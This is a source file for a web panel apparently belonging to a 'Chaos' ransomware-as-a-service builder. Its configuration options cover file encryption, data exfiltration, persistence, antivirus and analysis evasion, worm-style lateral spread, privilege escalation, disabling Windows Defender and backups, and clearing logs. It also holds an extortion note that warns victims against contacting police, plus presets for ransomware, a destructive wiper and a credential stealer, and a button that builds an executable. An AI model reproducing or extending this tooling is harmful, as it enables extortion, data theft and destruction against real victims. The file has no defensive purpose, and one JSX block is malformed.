'use client';

import { useState } from 'react';
import { 
  FileCode, 
  Download, 
  Settings, 
  CheckCircle, 
  AlertCircle,
  Loader2,
  Save,
  Trash2,
  Plus,
  ChevronDown,
  ChevronUp,
  Terminal,
  Shield,
  Zap,
  Globe,
  Lock,
  Unlock,
  Eye,
  EyeOff,
  Copy,
  Check,
  X
} from 'lucide-react';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/Card';
import { api } from '@/lib/api';
import { cn } from '@/lib/utils';
import toast from 'react-hot-toast';

interface BuilderTemplate {
  id: string;
  name: string;
  description: string;
  config: Record<string, any>;
  category: 'ransomware' | 'wiper' | 'stealer' | 'loader' | 'custom';
}

interface BuilderConfig {
  // Core
  campaignId: string;
  payloadName: string;
  
  // Encryption
  encryptionMode: 'Hybrid' | 'AES' | 'RSA';
  rsaKeySize: 2048 | 4096;
  aesKeySize: 128 | 256;
  encryptNetworkDrives: boolean;
  encryptRemovableDrives: boolean;
  
  // Targeting
  targetExtensions: string[];
  skipExtensions: string[];
  skipDirectories: string[];
  maxFileSizeMB: number;
  minFileSizeKB: number;
  
  // Exfiltration
  exfilEnabled: boolean;
  exfilServerUrl: string;
  exfilMaxFiles: number;
  exfilCompress: boolean;
  exfilEncrypt: boolean;
  exfilChunkSizeKB: number;
  
  // Persistence
  persistenceEnabled: boolean;
  persistenceMethods: string[];
  
  // Anti-Analysis
  antiVM: boolean;
  antiDebug: boolean;
  antiSandbox: boolean;
  amsiBypass: boolean;
  etwBypass: boolean;
  unhooking: boolean;
  
  // Lateral Movement
  wormMode: boolean;
  smbSpread: boolean;
  rdpHijack: boolean;
  wmiSpread: boolean;
  
  // Privilege Escalation
  uacBypass: boolean;
  tokenDuplication: boolean;
  
  // Stealth
  processInjection: 'none' | 'hollow' | 'doppleganging' | 'herpaderping';
  ppidSpoofing: boolean;
  blockDlls: boolean;
  
  // Geofencing
  geofencingEnabled: boolean;
  blockedCountries: string[];
  blockedIPs: string[];
  blockedDomains: string[];
  
  // Ransom Note
  ransomNoteEnabled: boolean;
  ransomNoteTemplate: string;
  ransomAmount: number;
  ransomCurrency: 'BTC' | 'XMR' | 'USDT';
  walletAddress: string;
  contactInfo: string;
  deadlineHours: number;
  
  // Advanced
  killProcesses: string[];
  killServices: string[];
  disableRecovery: boolean;
  disableDefender: boolean;
  clearLogs: boolean;
}

const defaultConfig: BuilderConfig = {
  campaignId: '',
  payloadName: 'ChaosPayload',
  encryptionMode: 'Hybrid',
  rsaKeySize: 4096,
  aesKeySize: 256,
  encryptNetworkDrives: true,
  encryptRemovableDrives: true,
  targetExtensions: ['.txt', '.doc', '.docx', '.pdf', '.sql', '.json', '.cs', '.py', '.js', '.ts', '.config', '.ini', '.xml', '.csv', '.xlsx', '.pptx', '.jpg', '.png', '.db', '.bak'],
  skipExtensions: ['.exe', '.dll', '.sys', '.msi', '.iso', '.img', '.vhd', '.bak', '.tmp', '.log', '.drv'],
  skipDirectories: ['windows', 'program files', 'program files (x86)', 'appdata\\local\\temp', '$recycle.bin', 'system volume information', 'boot'],
  maxFileSizeMB: 100,
  minFileSizeKB: 1,
  exfilEnabled: true,
  exfilServerUrl: '',
  exfilMaxFiles: 1000,
  exfilCompress: true,
  exfilEncrypt: true,
  exfilChunkSizeKB: 90,
  persistenceEnabled: true,
  persistenceMethods: ['run_key', 'scheduled_task', 'wmi_event'],
  antiVM: true,
  antiDebug: true,
  antiSandbox: true,
  amsiBypass: true,
  etwBypass: true,
  unhooking: true,
  wormMode: false,
  smbSpread: false,
  rdpHijack: false,
  wmiSpread: false,
  uacBypass: true,
  tokenDuplication: false,
  processInjection: 'hollow',
  ppidSpoofing: true,
  blockDlls: true,
  geofencingEnabled: true,
  blockedCountries: ['RU', 'BY', 'KZ', 'KG', 'TJ', 'TM', 'UZ', 'AM', 'AZ', 'GE', 'MD'],
  blockedIPs: [],
  blockedDomains: [],
  ransomNoteEnabled: true,
  ransomNoteTemplate: `YOUR FILES HAVE BEEN ENCRYPTED BY CHAOS RANSOMWARE

All your important files have been encrypted using military-grade encryption (RSA-4096 + AES-256).
Recovery without our private key is impossible.

To decrypt your files:
1. Send ${'{amount}'} ${'{currency}'} to wallet: ${'{wallet}'}
2. Contact us at: ${'{contact}'}
3. Provide your Victim ID: ${'{victim_id}'}
4. You will receive a decryptor within 24 hours.

DEADLINE: ${'{deadline}'}
After deadline, price doubles. After 72 hours, private key is destroyed.

Free proof: Send 1 small file (<1MB) for free decryption.

DO NOT:
- Modify encrypted files
- Run third-party decryption tools
- Contact law enforcement (we will know)

CHAOS RANSOMWARE - ${'{year}'}`,
  ransomAmount: 5000,
  ransomCurrency: 'BTC',
  walletAddress: '',
  contactInfo: 'chaos-support@onionmail.org',
  deadlineHours: 72,
  killProcesses: ['sqlservr.exe', 'mysql.exe', 'postgres.exe', 'oracle.exe', 'veeam.exe', 'backup.exe'],
  killServices: ['VeeamBackupSvc', 'SQLWriter', 'MSSQL$*', 'MySQL*'],
  disableRecovery: true,
  disableDefender: true,
  clearLogs: true,
};

const templates: BuilderTemplate[] = [
  {
    id: 'ransomware-standard',
    name: 'Standard Ransomware',
    description: 'Balanced config for general targeting. Hybrid encryption, exfiltration, basic persistence.',
    category: 'ransomware',
    config: { ...defaultConfig, payloadName: 'Chaos-Standard' },
  },
  {
    id: 'ransomware-aggressive',
    name: 'Aggressive Ransomware',
    description: 'Maximum features: worm mode, lateral movement, privilege escalation, anti-analysis suite.',
    category: 'ransomware',
    config: { 
      ...defaultConfig, 
      payloadName: 'Chaos-Aggressive',
      wormMode: true,
      smbSpread: true,
      rdpHijack: true,
      wmiSpread: true,
      uacBypass: true,
      tokenDuplication: true,
      processInjection: 'doppleganging',
      exfilMaxFiles: 5000,
    },
  },
  {
    id: 'ransomware-stealth',
    name: 'Stealth Ransomware',
    description: 'Low noise: no worm, minimal persistence, heavy anti-analysis, delayed execution.',
    category: 'ransomware',
    config: { 
      ...defaultConfig, 
      payloadName: 'Chaos-Stealth',
      persistenceEnabled: false,
      wormMode: false,
      antiVM: true,
      antiDebug: true,
      antiSandbox: true,
      amsiBypass: true,
      etwBypass: true,
      unhooking: true,
      processInjection: 'hollow',
      ppidSpoofing: true,
      blockDlls: true,
      clearLogs: true,
    },
  },
  {
    id: 'wiper-destructive',
    name: 'Destructive Wiper',
    description: 'No encryption, no exfil, no ransom. Pure destruction. Use with extreme caution.',
    category: 'wiper',
    config: { 
      ...defaultConfig, 
      payloadName: 'Chaos-Wiper',
      encryptionMode: 'AES',
      exfilEnabled: false,
      ransomNoteEnabled: false,
      persistenceEnabled: false,
      wormMode: true,
      disableRecovery: true,
      killProcesses: [...defaultConfig.killProcesses, 'lsass.exe', 'csrss.exe'],
    },
  },
  {
    id: 'stealer-targeted',
    name: 'Targeted Stealer',
    description: 'Exfiltration only. No encryption, no persistence. Grab credentials, cookies, wallets, docs.',
    category: 'stealer',
    config: { 
      ...defaultConfig, 
      payloadName: 'Chaos-Stealer',
      encryptionMode: 'AES',
      encryptNetworkDrives: false,
      encryptRemovableDrives: false,
      exfilEnabled: true,
      exfilMaxFiles: 500,
      ransomNoteEnabled: false,
      persistenceEnabled: false,
      targetExtensions: ['.txt', '.json', '.db', '.sqlite', '.log', '.config', '.ini', '.pem', '.key', '.wallet', '.dat'],
      skipExtensions: [],
    },
  },
];

export default function BuilderPage() {
  const [config, setConfig] = useState<BuilderConfig>(defaultConfig);
  const [building, setBuilding] = useState(false);
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [showPreview, setShowPreview] = useState(false);
  const [selectedTemplate, setSelectedTemplate] = useState<string>('ransomware-standard');
  const [buildProgress, setBuildProgress] = useState<{ stage: string; percent: number } | null>(null);

  const handleBuild = async () => {
    if (!config.campaignId) {
      toast.error('Select a campaign first');
      return;
    }
    if (!config.exfilServerUrl) {
      toast.error('Exfiltration server URL required');
      return;
    }

    setBuilding(true);
    setBuildProgress({ stage: 'Preparing build environment...', percent: 10 });

    try {
      // Simulate build stages
      const stages = [
        { stage: 'Generating encryption keys...', percent: 25 },
        { stage: 'Compiling payload...', percent: 50 },
        { stage: 'Applying obfuscation...', percent: 70 },
        { stage: 'Signing binary...', percent: 85 },
        { stage: 'Finalizing...', percent: 95 },
      ];

      for (const s of stages) {
        setBuildProgress(s);
        await new Promise(r => setTimeout(r, 800));
      }

      // Call API to build
      const blob = await api.buildPayload(config);
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `${config.payloadName}.exe`;
      a.click();
      URL.revokeObjectURL(url);

      toast.success('Payload built successfully!');
      setBuildProgress({ stage: 'Complete!', percent: 100 });
    } catch (error) {
      console.error('Build failed:', error);
      toast.error('Build failed. Check configuration.');
      setBuildProgress({ stage: 'Failed', percent: 0 });
    } finally {
      setBuilding(false);
      setTimeout(() => setBuildProgress(null), 3000);
    }
  };

  const handleTemplateSelect = (templateId: string) => {
    const template = templates.find(t => t.id === templateId);
    if (template) {
      setConfig({ ...template.config, campaignId: config.campaignId, exfilServerUrl: config.exfilServerUrl, walletAddress: config.walletAddress });
      setSelectedTemplate(templateId);
      toast.success(`Loaded ${template.name} template`);
    }
  };

  const sectionConfig = [
    {
      id: 'core',
      label: 'Core Settings',
      icon: Settings,
      fields: [
        { key: 'campaignId', label: 'Campaign ID', type: 'text', placeholder: 'camp_xxx (required)' },
        { key: 'payloadName', label: 'Payload Name', type: 'text', placeholder: 'ChaosPayload' },
      ],
    },
    {
      id: 'encryption',
      label: 'Encryption',
      icon: Lock,
      fields: [
        { key: 'encryptionMode', label: 'Mode', type: 'select', options: ['Hybrid', 'AES', 'RSA'] },
        { key: 'rsaKeySize', label: 'RSA Key Size', type: 'select', options: [2048, 4096] },
        { key: 'aesKeySize', label: 'AES Key Size', type: 'select', options: [128, 256] },
        { key: 'encryptNetworkDrives', label: 'Encrypt Network Drives', type: 'checkbox' },
        { key: 'encryptRemovableDrives', label: 'Encrypt Removable Drives', type: 'checkbox' },
      ],
    },
    {
      id: 'targeting',
      label: 'File Targeting',
      icon: FileCode,
      fields: [
        { key: 'targetExtensions', label: 'Target Extensions (comma-separated)', type: 'textarea', rows: 3 },
        { key: 'skipExtensions', label: 'Skip Extensions (comma-separated)', type: 'textarea', rows: 2 },
        { key: 'skipDirectories', label: 'Skip Directories (comma-separated)', type: 'textarea', rows: 2 },
        { key: 'maxFileSizeMB', label: 'Max File Size (MB)', type: 'number', min: 1, max: 500 },
        { key: 'minFileSizeKB', label: 'Min File Size (KB)', type: 'number', min: 1, max: 1000 },
      ],
    },
    {
      id: 'exfiltration',
      label: 'Exfiltration',
      icon: Globe,
      fields: [
        { key: 'exfilEnabled', label: 'Enable Exfiltration', type: 'checkbox' },
        { key: 'exfilServerUrl', label: 'Exfil Server URL', type: 'text', placeholder: 'https://your-project.vercel.app' },
        { key: 'exfilMaxFiles', label: 'Max Files', type: 'number', min: 1, max: 10000 },
        { key: 'exfilCompress', label: 'Compress (GZIP)', type: 'checkbox' },
        { key: 'exfilEncrypt', label: 'Encrypt Files', type: 'checkbox' },
        { key: 'exfilChunkSizeKB', label: 'Chunk Size (KB)', type: 'number', min: 10, max: 100 },
      ],
    },
    {
      id: 'persistence',
      label: 'Persistence',
      icon: Zap,
      fields: [
        { key: 'persistenceEnabled', label: 'Enable Persistence', type: 'checkbox' },
        { key: 'persistenceMethods', label: 'Methods (comma-separated)', type: 'text', placeholder: 'run_key,scheduled_task,wmi_event,com_hijack,service' },
      ],
    },
    {
      id: 'anti-analysis',
      label: 'Anti-Analysis',
      icon: Shield,
      fields: [
        { key: 'antiVM', label: 'VM Detection', type: 'checkbox' },
        { key: 'antiDebug', label: 'Debugger Detection', type: 'checkbox' },
        { key: 'antiSandbox', label: 'Sandbox Detection', type: 'checkbox' },
        { key: 'amsiBypass', label: 'AMSI Bypass', type: 'checkbox' },
        { key: 'etwBypass', label: 'ETW Bypass', type: 'checkbox' },
        { key: 'unhooking', label: 'Unhooking (syscalls)', type: 'checkbox' },
      ],
    },
    {
      id: 'lateral',
      label: 'Lateral Movement',
      icon: Globe,
      advanced: true,
      fields: [
        { key: 'wormMode', label: 'Worm Mode (auto-spread)', type: 'checkbox' },
        { key: 'smbSpread', label: 'SMB Spread (psexec/wmiexec)', type: 'checkbox' },
        { key: 'rdpHijack', label: 'RDP Hijack', type: 'checkbox' },
        { key: 'wmiSpread', label: 'WMI Spread', type: 'checkbox' },
      ],
    },
    {
      id: 'privesc',
      label: 'Privilege Escalation',
      icon: Shield,
      advanced: true,
      fields: [
        { key: 'uacBypass', label: 'UAC Bypass', type: 'checkbox' },
        { key: 'tokenDuplication', label: 'Token Duplication', type: 'checkbox' },
      ],
    },
    {
      id: 'stealth',
      label: 'Stealth & Injection',
      icon: Eye,
      advanced: true,
      fields: [
        { key: 'processInjection', label: 'Process Injection', type: 'select', options: ['none', 'hollow', 'doppleganging', 'herpaderping'] },
        { key: 'ppidSpoofing', label: 'PPID Spoofing', type: 'checkbox' },
        { key: 'blockDlls', label: 'Block Non-Microsoft DLLs', type: 'checkbox' },
      ],
    },
    {
      id: 'geofencing',
      label: 'Geofencing',
      icon: Globe,
      advanced: true,
      fields: [
        { key: 'geofencingEnabled', label: 'Enable Geofencing', type: 'checkbox' },
        { key: 'blockedCountries', label: 'Blocked Countries (ISO codes, comma-separated)', type: 'textarea', rows: 2 },
        { key: 'blockedIPs', label: 'Blocked IPs (CIDR, comma-separated)', type: 'textarea', rows: 2 },
        { key: 'blockedDomains', label: 'Blocked Domains (comma-separated)', type: 'textarea', rows: 2 },
      ],
    },
    {
      id: 'ransom',
      label: 'Ransom Note',
      icon: FileCode,
      fields: [
        { key: 'ransomNoteEnabled', label: 'Enable Ransom Note', type: 'checkbox' },
        { key: 'ransomNoteTemplate', label: 'Template (use {variables})', type: 'textarea', rows: 8 },
        { key: 'ransomAmount', label: 'Ransom Amount', type: 'number', min: 100, max: 1000000 },
        { key: 'ransomCurrency', label: 'Currency', type: 'select', options: ['BTC', 'XMR', 'USDT'] },
        { key: 'walletAddress', label: 'Wallet Address', type: 'text', placeholder: 'bc1... or 4... or TRX...' },
        { key: 'contactInfo', label: 'Contact Info', type: 'text', placeholder: 'email or tox ID' },
        { key: 'deadlineHours', label: 'Deadline (hours)', type: 'number', min: 1, max: 720 },
      ],
    },
    {
      id: 'cleanup',
      label: 'Cleanup & Defense Evasion',
      icon: Trash2,
      advanced: true,
      fields: [
        { key: 'killProcesses', label: 'Processes to Kill (comma-separated)', type: 'textarea', rows: 2 },
        { key: 'killServices', label: 'Services to Stop (comma-separated)', type: 'textarea', rows: 2 },
        { key: 'disableRecovery', label: 'Disable Recovery (vssadmin, wbadmin)', type: 'checkbox' },
        { key: 'disableDefender', label: 'Disable Windows Defender', type: 'checkbox' },
        { key: 'clearLogs', label: 'Clear Event Logs', type: 'checkbox' },
      ],
    },
  ];

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-3xl font-bold text-gradient">Payload Builder</h1>
          <p className="text-gray-400 mt-1">Configure and compile custom payloads</p>
        </div>
        <div className="flex items-center gap-2">
          <select
            value={selectedTemplate}
            onChange={e => handleTemplateSelect(e.target.value)}
            className="input-field w-auto"
          >
            {templates.map(t => <option key={t.id} value={t.id}>{t.name}</option>)}
          </select>
        </div>
      </div>

      {/* Template Description */}
      <div className="card">
        const template = templates.find(t => t.id === selectedTemplate);
        <p className="text-gray-300">{template?.description}</p>
      </div>

      {/* Build Progress */}
      {buildProgress && (
        <div className="card">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm font-medium">{buildProgress.stage}</span>
            <span className="text-sm text-chaos-gold">{buildProgress.percent}%</span>
          </div>
          <div className="h-2 bg-chaos-border rounded-full overflow-hidden">
            <div 
              className="h-full bg-gradient-to-r from-chaos-gold to-chaos-goldHover transition-all duration-300"
              style={{ width: `${buildProgress.percent}%` }}
            />
          </div>
        </div>
      )}

      {/* Config Sections */}
      <div className="space-y-4">
        {sectionConfig.map((section, sectionIndex) => (
          section.advanced && !showAdvanced ? null : (
            <ConfigSection
              key={section.id}
              section={section}
              config={config}
              onChange={setConfig}
              index={sectionIndex}
            />
          )
        ))}
      </div>

      {/* Advanced Toggle */}
      <button
        onClick={() => setShowAdvanced(!showAdvanced)}
        className="btn-secondary flex items-center gap-2 w-full sm:w-auto"
      >
        {showAdvanced ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
        {showAdvanced ? 'Hide Advanced' : 'Show Advanced'} ({sectionConfig.filter(s => s.advanced).length} sections)
      </button>

      {/* Action Buttons */}
      <div className="flex flex-col sm:flex-row gap-4 pt-4 border-t border-chaos-border/30">
        <button
          onClick={handleBuild}
          disabled={building}
          className="btn-primary flex-1 flex items-center justify-center gap-2 text-lg py-3"
        >
          {building ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin" />
              Building...
            </>
          ) : (
            <>
              <Terminal className="w-5 h-5" />
              Build Payload
            </>
          )}
        </button>
        <button
          onClick={() => setShowPreview(!showPreview)}
          className="btn-secondary flex items-center justify-center gap-2"
        >
          <Eye className="w-4 h-4" />
          Preview Config
        </button>
        <button
          onClick={() => {
            const blob = new Blob([JSON.stringify(config, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${config.payloadName}.config.json`;
            a.click();
            URL.revokeObjectURL(url);
          }}
          className="btn-secondary flex items-center justify-center gap-2"
        >
          <Download className="w-4 h-4" />
          Export JSON
        </button>
      </div>

      {/* Preview Modal */}
      {showPreview && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
          <div className="card w-full max-w-3xl max-h-[80vh] overflow-auto animate-in">
            <CardHeader className="flex flex-row items-center justify-between">
              <CardTitle>Configuration Preview</CardTitle>
              <button onClick={() => setShowPreview(false)} className="text-gray-400 hover:text-white">
                <X className="w-6 h-6" />
              </button>
            </CardHeader>
            <CardContent>
              <pre className="text-sm text-gray-300 font-mono bg-chaos-bg p-4 rounded-lg overflow-auto max-h-[60vh]">
                {JSON.stringify(config, null, 2)}
              </pre>
            </CardContent>
          </div>
        </div>
      )}
    </div>
  );
}

function ConfigSection({ section, config, onChange, index }: { section: any; config: BuilderConfig; onChange: (c: BuilderConfig) => void; index: number }) {
  const renderField = (field: any) => {
    const value = config[field.key as keyof BuilderConfig];
    const handleChange = (newValue: any) => {
      onChange({ ...config, [field.key]: newValue });
    };

    switch (field.type) {
      case 'checkbox':
        return (
          <label className="flex items-center gap-3 cursor-pointer">
            <input
              type="checkbox"
              checked={value as boolean}
              onChange={e => handleChange(e.target.checked)}
              className="w-4 h-4 rounded border-chaos-border bg-chaos-bg text-chaos-gold focus:ring-chaos-gold"
            />
            <span className="text-sm">{field.label}</span>
          </label>
        );
      case 'select':
        return (
          <div>
            <label className="block text-sm font-medium mb-1">{field.label}</label>
            <select
              value={value}
              onChange={e => handleChange(field.options.includes(Number(e.target.value)) ? Number(e.target.value) : e.target.value)}
              className="input-field"
            >
              {field.options.map((opt: any) => (
                <option key={opt} value={opt}>{opt}</option>
              ))}
            </select>
          </div>
        );
      case 'textarea':
        return (
          <div>
            <label className="block text-sm font-medium mb-1">{field.label}</label>
            <textarea
              value={Array.isArray(value) ? value.join(', ') : value}
              onChange={e => handleChange(field.key.includes('Extensions') || field.key.includes('Directories') || field.key.includes('Countries') || field.key.includes('IPs') || field.key.includes('Domains') || field.key.includes('Processes') || field.key.includes('Services') 
                ? e.target.value.split(',').map(s => s.trim()).filter(Boolean)
                : e.target.value)}
              className="input-field font-mono text-xs"
              rows={field.rows || 3}
              placeholder={field.placeholder}
            />
          </div>
        );
      case 'number':
        return (
          <div>
            <label className="block text-sm font-medium mb-1">{field.label}</label>
            <input
              type="number"
              value={value}
              onChange={e => handleChange(Number(e.target.value))}
              min={field.min}
              max={field.max}
              className="input-field"
              placeholder={field.placeholder}
            />
          </div>
        );
      default:
        return (
          <div>
            <label className="block text-sm font-medium mb-1">{field.label}</label>
            <input
              type="text"
              value={value}
              onChange={e => handleChange(e.target.value)}
              className="input-field"
              placeholder={field.placeholder}
            />
          </div>
        );
    }
  };

  return (
    <div className="card animate-in" style={{ animationDelay: `${index * 30}ms` }}>
      <CardHeader>
        <div className="flex items-center gap-3">
          <section.icon className="w-5 h-5 text-chaos-gold" />
          <CardTitle>{section.label}</CardTitle>
        </div>
      </CardHeader>
      <CardContent>
        <div className="space-y-4 grid grid-cols-1 md:grid-cols-2 gap-4">
          {section.fields.map((field: any, i: number) => (
            <div key={field.key} className={cn(field.type === 'textarea' && 'md:col-span-2')}>
              {renderField(field)}
            </div>
          ))}
        </div>
      </CardContent>
    </div>
  );
}